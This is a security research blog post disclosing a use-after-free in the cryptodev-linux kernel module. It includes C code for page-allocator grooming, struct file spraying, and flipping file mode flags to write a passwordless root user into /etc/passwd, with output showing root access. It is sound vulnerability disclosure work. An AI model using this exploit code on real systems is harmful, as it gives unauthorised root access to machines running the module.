---
title: "[Cryptodev-linux] Page-level UAF exploitation"
published: 2026-01-12
tags: ["nasm", "pwn", "linux", "kernel", "kernel exploitation", "cryptodev-linux", "cryptodev"]
category: "research"
description: LPE for cryptodev-linux oot module (CVE-2026-28529)
draft: false
---

# Introduction

In november 2025 I started a fuzzing campaign against [cryptodev-linux](https://github.com/cryptodev-linux/cryptodev-linux) as part of a school project. I found +10 bugs (UAF, NULL pointer dereferences and integer overflows) and among all of these bugs one was surprisingly suitable for a privilege escalation.

For a little bit of background, according to their github page:
> This is a /dev/crypto device driver, equivalent to those in OpenBSD or FreeBSD. The main idea is to access existing ciphers in kernel space from userspace, thus enabling the re-use of a hardware implementation of a cipher.

Cryptodev-linux is not widely used today, but it was popular when the native kernel crypto (socket) API was slower. Nowadays it is supported and included in various frameworks and projects such as:  [dpdk](https://doc.dpdk.org/guides-25.03/prog_guide/cryptodev_lib.html), [OpenEmbedded](https://layers.openembedded.org/layerindex/recipe/24849/) and [kobol NAS](https://wiki.kobol.io/helios4/cesa/#install-cryptodev).

# Basic design

The cryptodev API is quite straightforward. You first create a session using the file descriptor of the `/dev/crypto` device, specifying the encryption type and the key size:
```c
session.cipher = CRYPTO_AES_CBC;
session.keylen = KEY_SIZE;
session.key = (void*)key;

if (ioctl(cfd, CIOCGSESSION, &session)) {
    perror("ioctl(CIOCGSESSION)");
    return -1;
}
```

Then, you can start encrypting data like this:
```c
cryp.ses = session.ses; // session id
cryp.len = CIPHER_SZ;
cryp.src = plain;
cryp.dst = cipher;
cryp.iv = (void*)iv;
cryp.op = COP_ENCRYPT; // it means we want the basic zero copy encryption logic
if (ioctl(cfd, CIOCCRYPT, &cryp)) {
    perror("ioctl(CIOCCRYPT)");
    return -1;
}
```

The actual encryption logic for zero copy encryptions is located in the `__crypto_run_zc` function:
```c
/* This is the main crypto function - zero-copy edition */
static int
__crypto_run_zc(struct csession *ses_ptr, struct kernel_crypt_op *kcop)
{
	struct scatterlist *src_sg, *dst_sg;
	struct crypt_op *cop = &kcop->cop;
	int ret = 0;

	ret = get_userbuf(ses_ptr, cop->src, cop->len, cop->dst, cop->len,
	                  kcop->task, kcop->mm, &src_sg, &dst_sg);
	if (unlikely(ret)) {
		derr(1, "Error getting user pages. Falling back to non zero copy.");
		return __crypto_run_std(ses_ptr, cop);
	}

	ret = hash_n_crypt(ses_ptr, cop, src_sg, dst_sg, cop->len);

	release_user_pages(ses_ptr);
	return ret;
}
```

`hash_n_crypt` is basically just using the internal crypto drivers of the linux kernel.

`release_user_pages` is a key part of the exploitation process, it is iterating through the userland pages provided by the user (the src and dst buffers) and is calling `put_page` on it. Notably, `ses->pages` is not cleared out.
```c
void release_user_pages(struct csession *ses)
{
	unsigned int i;

	for (i = 0; i < ses->used_pages; i++) {
		if (!PageReserved(ses->pages[i]))
			SetPageDirty(ses->pages[i]);

		if (ses->readonly_pages == 0)
			flush_dcache_page(ses->pages[i]);
		else
			ses->readonly_pages--;

		put_page(ses->pages[i]);
	}
	ses->used_pages = 0;
}
```

These pages (`ses->pages`) are returned by `get_user_pages_remote` in [`__get_userbuf`](https://github.com/cryptodev-linux/cryptodev-linux/blob/master/zc.c#L49). `__get_userbuf` is returning an array of `struct page*`, what happens is that, to be able to handle the userland pages, the linux crypto drivers need to have a proper scatterlist initialized such as each node contains a reference to the target userland page. 

By returning this array, `get_user_pages_remote` increments the refcount of each of these pages. So what happens is that `release_user_pages` is releasing these references towards the `struct page*` used during the encryption request. And releasing references means basically to decrement the reference counter.

## The bug

The exploitable bug we will be focusing on in this blogpost lies in the `get_userbuf` function:
```c

/* make src and dst available in scatterlists.
 * dst might be the same as src.
 */
int get_userbuf(struct csession *ses,
                void *__user src, unsigned int src_len,
                void *__user dst, unsigned int dst_len,
                struct task_struct *task, struct mm_struct *mm,
                struct scatterlist **src_sg,
                struct scatterlist **dst_sg)
{
	int src_pagecount, dst_pagecount;
	int rc;

	/* Empty input is a valid option to many algorithms & is tested by NIST/FIPS */
	/* Make sure NULL input has 0 length */
	if (!src && src_len)
		src_len = 0;

	/* I don't know that null output is ever useful, but we can handle it gracefully */
	/* Make sure NULL output has 0 length */
	if (!dst && dst_len)
		dst_len = 0;

	src_pagecount = PAGECOUNT(src, src_len);
	dst_pagecount = PAGECOUNT(dst, dst_len);

	ses->used_pages = (src == dst) ? max(src_pagecount, dst_pagecount)
	                               : src_pagecount + dst_pagecount;

	ses->readonly_pages = (src == dst) ? 0 : src_pagecount;

	if (ses->used_pages > ses->array_size) {
		rc = adjust_sg_array(ses, ses->used_pages);
		if (rc)
			return rc;
	}

	if (src == dst) {	/* inplace operation */
		/* When we encrypt for authenc modes we need to write
		 * more data than the ones we read. */
		if (src_len < dst_len)
			src_len = dst_len;
		rc = __get_userbuf(src, src_len, 1, ses->used_pages,
			               ses->pages, ses->sg, task, mm);
		if (unlikely(rc)) {
			derr(1, "failed to get user pages for data IO");
			return rc;
		}
		(*src_sg) = (*dst_sg) = ses->sg;
		return 0;
	}

	*src_sg = NULL; /* default to no input */
	*dst_sg = NULL; /* default to ignore output */

	if (likely(src)) {
		rc = __get_userbuf(src, src_len, 0, ses->readonly_pages,
					   ses->pages, ses->sg, task, mm);
		if (unlikely(rc)) {
			derr(1, "failed to get user pages for data input");
			return rc;
		}
		*src_sg = ses->sg;
	}

	if (likely(dst)) {
		const unsigned int writable_pages =
			ses->used_pages - ses->readonly_pages;
		struct page **dst_pages = ses->pages + ses->readonly_pages;
		*dst_sg = ses->sg + ses->readonly_pages;

		rc = __get_userbuf(dst, dst_len, 1, writable_pages,
					   dst_pages, *dst_sg, task, mm);
		if (unlikely(rc)) {
			derr(1, "failed to get user pages for data output");
			release_user_pages(ses);  /* FIXME: use __release_userbuf(src, ...) */
			return rc;
		}
	}
	return 0;
}
```

There are actually a lot of issues with this function, including tons of integer overflows, but what is interesting is that if the destination exists, is and invalid and that the src is `NULL` for example, then the last call to `__get_userbuf` will fail and call `release_user_pages` at line 77.

At this point, `ses->used_pages` contains the number of pages of the destination buffer given `src != dst`.

The bug is basically that `release_user_pages` is called while `ses->pages` hasn't been modified and that `ses->used_pages` exists. It leads to a double free. Not exactly a double free, it allows an attacker to decrement the reference counter of a userland page he controls as many times as he want to.

When the reference counter hits zero the page gets freed, it gets freed while we can still access it through the PTEs of our process which is a very powerful UAF primitive.

## Exploitation

Now I described the bug, we can have fun exploiting this powerful primitive!

The exploitation strategy is actually quite simple: triggering a slab request for our set of freed pages so we can hijack interesting structures.

When a page is freed, it is initially sent back to the Per-CPU Page allocator (PCP), which is not ideal if we want to reallocate it as a slab. When a slab requires more memory, it allocates pages through the buddy allocator. Therefore, the first step is to return our pages to the buddy allocator. To achieve this, we must flush the PCP, which typically occurs when a large volume of pages is freed simultaneously.

To trigger this, we can allocate a large number of pages prior to triggering the bug, and immediately afterward, free the entire set of allocated pages:
```c

#define MAX_PAGES 1000000
void *pages[MAX_PAGES];
int page_count = 0;

void free_all_pages(int count) {
    for (int i = 0; i < count; i++) {
        if (pages[i] != MAP_FAILED) {
            munmap(pages[i], 4096);
            pages[i] = MAP_FAILED;
        }
    }
    page_count -= count;
}

void stress_pcp_flush(int count) {
    for (int i = 0; i < count && page_count < MAX_PAGES; i++) {
        pages[page_count] = mmap(NULL, 4096, 
                                PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS,
                                -1, 0);
        if (pages[page_count] != MAP_FAILED) {
            // Touch to commit
            ((char*)pages[page_count])[0] = 'A' + (i % 26);
            page_count++;
        }
    }
}

...
stress_pcp_flush(300000);

cryp.ses = session.ses;
cryp.len = CIPHER_SZ;
cryp.src = NULL;
cryp.dst = (uint8_t* )0xdeadbeef;
cryp.iv = (void*)iv;
cryp.op = COP_ENCRYPT;

if (ioctl(cfd, CIOCCRYPT, &cryp)) {
    //perror("ioctl(CIOCCRYPT)");
}

free_all_pages(300000);
```

This will successfully flush the vulnerable pages back to the buddy allocator.

### Page migration

This is the only tricky part of the exploit, because slabs are typically allocated using `GFP_KERNEL`. For example, a [`struct file*`](https://elixir.bootlin.com/linux/v6.15/source/fs/file_table.c#L234) is allocated this way, which causes the buddy allocator to look for pages that are unmovable (`MIGRATE_UNMOVABLE`). This logic is handled within `__rmqueue`:
```c

/*
 * Do the hard work of removing an element from the buddy allocator.
 * Call me with the zone->lock already held.
 */
static __always_inline struct page *
__rmqueue(struct zone *zone, unsigned int order, int migratetype,
	  unsigned int alloc_flags, enum rmqueue_mode *mode)
{
	struct page *page;

	if (IS_ENABLED(CONFIG_CMA)) {
		/*
		 * Balance movable allocations between regular and CMA areas by
		 * allocating from CMA when over half of the zone's free memory
		 * is in the CMA area.
		 */
		if (alloc_flags & ALLOC_CMA &&
		    zone_page_state(zone, NR_FREE_CMA_PAGES) >
		    zone_page_state(zone, NR_FREE_PAGES) / 2) {
			page = __rmqueue_cma_fallback(zone, order);
			if (page)
				return page;
		}
	}

	/*
	 * First try the freelists of the requested migratetype, then try
	 * fallbacks modes with increasing levels of fragmentation risk.
	 *
	 * The fallback logic is expensive and rmqueue_bulk() calls in
	 * a loop with the zone->lock held, meaning the freelists are
	 * not subject to any outside changes. Remember in *mode where
	 * we found pay dirt, to save us the search on the next call.
	 */
	switch (*mode) {
	case RMQUEUE_NORMAL:
		page = __rmqueue_smallest(zone, order, migratetype);
		if (page)
			return page;
		fallthrough;
	case RMQUEUE_CMA:
		if (alloc_flags & ALLOC_CMA) {
			page = __rmqueue_cma_fallback(zone, order);
			if (page) {
				*mode = RMQUEUE_CMA;
				return page;
			}
		}
		fallthrough;
	case RMQUEUE_CLAIM:
		page = __rmqueue_claim(zone, order, migratetype, alloc_flags);
		if (page) {
			/* Replenished preferred freelist, back to normal mode. */
			*mode = RMQUEUE_NORMAL;
			return page;
		}
		fallthrough;
	case RMQUEUE_STEAL:
		if (!(alloc_flags & ALLOC_NOFRAGMENT)) {
			page = __rmqueue_steal(zone, order, migratetype);

			if (page) {
				*mode = RMQUEUE_STEAL;
				return page;
			}
		}
	}
	return NULL;
}
```

It will first look for pages of the same order and migratetype, then it will look for pages of higher order (increasing the risk of fragmentation) with the same migratetype, and finally, it will look for pages of a different migratetype. This is exactly what we want for our exploit.

To address this issue, we just need to adjust one thing: the spray of userland pages in our process. I mentioned page migration from `MIGRATE_UNMOVABLE` requests to `MIGRATE_MOVABLE`, but the opposite is also true. If we allocate a large number of pages in our process, it will exhaust the `MIGRATE_UNMOVABLE` buddy allocator freelists as well. Consequently, when we start spraying the target objects, the `RMQUEUE_STEAL` switch case will be reached quickly.

## struct file spraying

I am not sure about the official name of this technique. [Kuzey](https://kuzey.rs/posts/Dirty_Page_Table/) calls it DirtyCred, but to me, DirtyCred implies `struct cred *` swapping, which is not what is happening here. However, a file-based DirtyCred method was previously demonstrated by [StarLabs](https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/). Regardless, I am using the technique described in the [Exodus Intelligence](https://blog.exodusintel.com/2024/03/27/mind-the-patch-gap-exploiting-an-io_uring-vulnerability-in-ubuntu/) blog post.

The technique is straightforward: once we have successfully sprayed enough `struct file` objects in memory, we search for the `ext4_file_operations` pointer pattern, which corresponds to the second field of the `struct file`. Once found, we simply modify the file mode. This allows us to write to the file even if it was originally opened with read-only permissions.

A good target file would be `/etc/passwd`, as a non-root user we are allowed to open it in read only and thanks to this technique we can write arbitrary content to this file:
```c
for (int i = 0; i < 10485; i++) {
    fd = open("/etc/passwd", O_RDONLY);
}

int offt_mode = find_ext4_ops(plain, CIPHER_SZ) - 4;

if (offt_mode < 0) {
    printf("[-] Failed to find ext4_file_operations pointer in plain\n");

    offt_mode = find_ext4_ops(cipher, CIPHER_SZ) - 4;

    if (offt_mode < 0) {
        printf("[-] Failed to find ext4_file_operations pointer in cipher\n");
        printf("[+] Trying again!...\n");

        return loop_xpl(cfd);
    }

    *(uint32_t* )&cipher[offt_mode] |= (FMODE_WRITE | FMODE_CAN_WRITE);
} else {
    *(uint32_t* )&plain[offt_mode] |= (FMODE_WRITE | FMODE_CAN_WRITE);
}

const char *evil_user = "nasm::0:0:root:/root:/bin/bash\n";
for (size_t i = 3; i < 10485 + 3; i++)
{
    if (write(i, evil_user, sizeof(evil_user)) > 0) {
        printf("[+] Wrote evil user to fd %zu\n", i);
        close(i);
        break;
    }
    
    close(i);
}
```

If we failed to spray correctly the `struct file`, nothing stops us to try it again, and again. Which makes the exploit pretty stable!

Which gives:
```
nasm@syzkaller:~$ ./poc 
[*] Increasing file descriptor limit...
[*] Triggered the bug...
[*] Spraying file objects...
[-] Failed to find ext4_file_operations pointer in plain
[-] Failed to find ext4_file_operations pointer in cipher
[+] Trying again!...
[*] Triggered the bug...
[*] Spraying file objects...
[+] Found potential ext4_ops: 0xffffffffab631340 at offset 0x8
[*] Done. Check /etc/passwd for new root user 'nasm'.

nasm@off:/media/cryptodev-linux-exploit$ ssh -p 10021 nasm@127.0.0.1
...
nasm@syzkaller:~# id
uid=0(nasm) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0
```

You can find the final exploit code [here](https://gist.github.com/n4sm/0fd2479e0c23e0fa2f192cd8fda45750).

## Misc

I used the following kernel options to compile my kernel:
`make defconfig && make kvm_guest.config && ./scripts/config -e CONFIG_DEBUG_INFO_DWARF4 -e CONFIG_CONFIGFS_FS && make olddefconfig`
You can download the kernel source from https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.15.4.tar.gz:
```
6bfb8a8d4b33ddbec44d78789e0988a78f5f5db1df0b3c98e4543ef7a5b15b97  linux-6.15.4.tar.gz
```

I used the following qemu options:
```
qemu-system-x86_64 \
	-m 2G \
	-smp 2 \
	-kernel "/media/kernel_fuzzing/cryptodevFuzzing/linux-exploit/arch/x86/boot/bzImage" \
	-append "console=ttyS0 kaslr root=/dev/sda earlyprintk=serial net.ifnames=0" \
	-drive file="/media/nixos/Documents/syzkaller/bullseye.img",format=raw \
	-net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \
	-net nic,model=e1000 \
	-nographic \
	-pidfile vm.pid \
	>&1 | tee vm.log
```

You might have to adjust the amount of pages you spray according to the amount of memory / cores of the target system.